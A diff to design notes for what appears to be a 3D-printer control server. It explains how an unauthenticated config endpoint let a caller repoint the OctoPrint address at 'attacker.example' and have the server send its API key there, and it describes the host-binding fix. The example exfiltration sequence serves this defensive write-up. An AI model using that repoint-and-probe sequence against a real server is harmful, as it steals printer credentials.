@@ -861,11 +861,61 @@ FastAPI application with:
   support, and the same arbitrary read reachable through
   `GET /system/printer/status`; that fallback is gone. `PrinterSetup`'s datalist was
   already entirely `pythonsrc/profiles/*.json`.
-  **Still open, and worse than either:** `PUT /config` has no authentication, so a
-  caller can repoint `OCTOPRINT_URL` at their own host and have the server ship it
-  `OCTOPRINT_API_KEY`. That is a bigger hole than any profile read and wants its own
-  issue.
+  **The bigger hole beside it** — `POST /config` has no authentication, so a caller
+  could repoint `OCTOPRINT_URL` at their own host and have the server ship it
+  `OCTOPRINT_API_KEY` — is closed by the host binding below.
 - **Config store** (`config_store.py`): Fernet-encrypted key-value store in the telemetry database (`app_config` table); the key stays on the host at `$DS_CONFIG_KEY_PATH`, default `~/.ds-mvp/.config_key`
+- **A printer credential is bound to the host it was saved for.** `POST /config` has
+  no authentication and it writes *both halves* of an authenticated outbound request:
+  the address and the key. So one request repointing `OCTOPRINT_URL` at
+  `http://attacker.example/`, followed by `POST /config/test-connection`, made this
+  server send `GET http://attacker.example/api/version` carrying the real
+  `X-Api-Key` — a confused deputy, and one that masking the key in `GET /config` does
+  nothing about, because the caller never needed to read it. `MOONRAKER_API_KEY` and
+  `BAMBU_CODE` reached the same shape at dispatch. The fix is a **binding, not a
+  check**: `ConfigStore.set` records `OCTOPRINT_API_KEY_HOST` /
+  `MOONRAKER_API_KEY_HOST` / `BAMBU_CODE_HOST` — scheme, host and port, default port
+  dropped — at the moment the *credential* is written, and
+  `bound_printer_credential()` is the single place that decides whether a key may go
+  out. Changing the address alone therefore moves nothing; **re-saving the key
+  re-binds it**, which is a person deciding about a host they just typed. The
+  binding lives in the store rather than in the endpoint because a key is also saved
+  by `applyOctoprintSimulator` and by the simulator wiring, none of which goes
+  through `POST /config`. Six outbound paths ask: `test_connection` (which still
+  probes, keylessly, and appends the reason — a silent 401 reads as a wrong key and
+  sends someone to re-type a correct one), the job detail's own printer probe,
+  `subprocess_env` (`OCTOPRINT_API_KEY` is on the allowlist, which was the other way
+  out), `resolve_printer_target`, the dispatch gate, which **refuses with a
+  409** rather than dispatching keyless — the operator would be rejected by the
+  machine and leave a job reading as dispatched — and the **operator subprocess it
+  launches**, which was the one the first version of this binding missed. That one is
+  worth stating in full, because two things had to be true at once for it to leak and
+  neither was visible from the other's code. `subprocess_env` checked
+  `OCTOPRINT_API_KEY` against `OCTOPRINT_URL`; the dispatch block then overwrote
+  `env["OCTOPRINT_URL"]` with `target["base_url"]`, which on a klipper or bambu
+  profile is `MOONRAKER_URL` or `BAMBU_IP`; and `run_operator.py` paired exactly those
+  two variables. The gate above it asked only about the *target* firmware's
+  credential — unset, therefore not withheld, therefore a pass. So an OctoPrint key
+  bound to someone's own printer left for an address an unauthenticated `POST /config`
+  had just named. The fix is that **the operator is told which printer in the same
+  three variables the pipeline is told in** — `DS_FIRMWARE`, `DS_PRINTER_URL`,
+  `DS_PRINTER_KEY`, the last of them the gate's own firmware-resolved answer — and
+  `OCTOPRINT_API_KEY` is removed from that child's environment outright. The same
+  edit closed the other half: `subprocess_env` starts from `os.environ`, and
+  `OCTOPRINT_API_KEY` is documented in `.env.template` and loaded into every compose
+  service by `env_file`, so with no key *stored* the binding had nothing to withhold
+  and the inherited one was never overwritten. Withholding now **removes** rather than
+  declining to set — a printer credential in a child's environment comes from the
+  bound store or it does not come at all. The three `*_HOST` keys are in
+  `CONFIG_KEYS` because `set()` must accept them, and in `INTERNAL_CONFIG_KEYS` so
+  the HTTP surface refuses them: a writable `OCTOPRINT_API_KEY_HOST` is the same hole
+  with one more request in it. `GET`/`POST /config` carry a `host_binding` block so
+  Settings can say *key bound to host X* — the extra step is only fair if it is
+  visible. Two consequences, both deliberate: a key saved **before** its address is
+  bound to nothing and stays unsendable until re-saved, and a profile's own `api_key`
+  is only ever paired with the profile's own `base_url`, never with a stored address.
+  `tests/test_credential_host_binding.py` runs the whole table over all three
+  credentials.
 - **A stored value reaches a subprocess through one allowlist, and never through
   `os.environ`.** `POST /config` wrote the store *and* `os.environ[key]`, the startup
   hook copied the whole store into `os.environ` besides, and both launches —
